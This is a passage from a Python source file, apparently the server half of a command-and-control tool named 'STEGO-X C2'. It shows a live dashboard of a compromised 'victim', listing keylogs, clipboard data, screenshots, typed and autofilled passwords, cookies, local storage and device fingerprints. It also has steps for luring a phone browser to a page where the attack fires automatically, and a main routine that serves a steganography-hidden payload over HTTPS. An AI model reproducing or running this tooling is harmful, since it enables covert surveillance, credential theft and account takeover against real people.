        latest = state["exfil_data"][-1]
        d      = latest["data"]
        lines  = (
            f"[bold red]VICTIM COMPROMISED  "
            f"[{latest['time']}]  FROM {latest['ip']}[/bold red]  "
            f"[dim]Session #{state['exfil_count']}[/dim]\n\n"
        )
        sections = [
            ("STEGO COMMAND", [
                ("c2_command",  "bold red"),
                ("status",      "bold red"),
                ("cred_source", "yellow"),
            ]),
            ("KEYLOGGER (LIVE)", [
                ("keylog_live",    "bold yellow"),
                ("keylog_so_far",  "yellow"),
            ]),
            ("CLIPBOARD (LIVE)", [
                ("clipboard_live", "bold yellow"),
                ("clipboard_last", "yellow"),
            ]),
            ("SCREENSHOT", [
                ("screenshot_status", "green"),
            ]),
            ("CREDENTIALS", [
                ("typed_email",    "bold yellow"),
                ("typed_pass",     "bold yellow"),
                ("autofill_email", "yellow"),
                ("autofill_pass",  "yellow"),
            ]),
            ("COOKIES", [
                ("cookies", "yellow"),
            ]),
            ("STORAGE", [
                ("local_storage", "yellow"),
            ]),
            ("DEVICE FINGERPRINT", [
                ("screen",       "white"),
                ("timezone",     "white"),
                ("platform",     "white"),
                ("gpu_renderer", "white"),
                ("memory_gb",    "white"),
                ("cpu_cores",    "white"),
                ("connection",   "white"),
                ("user_agent",   "dim"),
            ]),
        ]
        for sec_name, fields in sections:
            sec_lines = []
            for key, color in fields:
                if key in d:
                    val     = str(d[key])
                    display = (val[:65] + "...") if len(val) > 65 else val
                    if display not in ("[not typed]","[empty]","unknown","[none yet]","unset"):
                        sec_lines.append(
                            f"  [cyan]{key.upper():<22}[/cyan] [{color}]{display}[/{color}]"
                        )
            if sec_lines:
                lines += f"[dim]  -- {sec_name} --[/dim]\n"
                lines += "\n".join(sec_lines) + "\n\n"

        lines += (
            f"  [dim]Full data saved to:[/dim] [green]exfil_sessions/[/green]  "
            f"[dim]Screenshots:[/dim] [green]exfil_screenshots/[/green]  "
            f"[dim]Log:[/dim] [green]exfil_log.json[/green]"
        )
        layout["exfil"].update(Panel(lines,
            title="[bold red][ EXFILTRATED -- KEYLOG | CLIPBOARD | SCREENSHOT | COOKIES | STORAGE ][/bold red]",
            border_style="red"))
    else:
        layout["exfil"].update(Panel(
            f"[dim]Waiting for victim...\n\n"
            f"  1. Phone Chrome -> {proto}://192.168.2.21:{port}/setup\n"
            f"  2. Attack fires automatically\n"
            f"  3. Screenshots saved to exfil_screenshots/\n"
            f"  4. Full sessions saved to exfil_sessions/\n"
            f"  5. Everything logged to exfil_log.json[/dim]",
            title="[dim][ WAITING FOR VICTIM ][/dim]", border_style="dim"))

    layout["foot"].update(Panel(
        f"[dim]CTRL+C to stop  |  Sessions: exfil_sessions/  |  "
        f"Screenshots: exfil_screenshots/  |  Log: exfil_log.json[/dim]",
        border_style="dim"))
    return layout


# ─────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(description="STEGO-X C2 Part 2")
    p.add_argument("--image",     required=True)
    p.add_argument("--port",      type=int, default=8080)
    p.add_argument("--host",      default="0.0.0.0")
    p.add_argument("--cert",      default="cert.pem")
    p.add_argument("--key",       default="key.pem")
    p.add_argument("--no-https",  action="store_true")
    a = p.parse_args()

    if not Path(a.image).exists():
        console.print(f"[red]X Image not found: {a.image}[/red]")
        sys.exit(1)

    use_https = not a.no_https
    if use_https and (not Path(a.cert).exists() or not Path(a.key).exists()):
        console.print("[yellow]Certs not found — running HTTP. Use --no-https to suppress this.[/yellow]")
        use_https = False

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except Exception:
        local_ip = "127.0.0.1"

    with state_lock:
        state.update({
            "server_ip":   local_ip,
            "server_port": a.port,
            "stego_path":  a.image,
            "payload":     decode_stego(a.image),
            "https":       use_https,
        })

    server = HTTPServer((a.host, a.port), C2Handler)
    if use_https:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(a.cert, a.key)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)

    threading.Thread(target=server.serve_forever, daemon=True).start()

    console.clear()
    try:
        with Live(render(), console=console,
                  refresh_per_second=4, screen=True) as live:
            while True:
                live.update(render())
                time.sleep(0.25)
    except KeyboardInterrupt:
        console.print("\n[bold red][ C2 SERVER STOPPED ][/bold red]")
        console.print(f"[green]Sessions saved to: exfil_sessions/[/green]")
        console.print(f"[green]Screenshots saved to: exfil_screenshots/[/green]")
        console.print(f"[green]Full log: exfil_log.json[/green]")
        server.shutdown()


if __name__ == "__main__":
    main()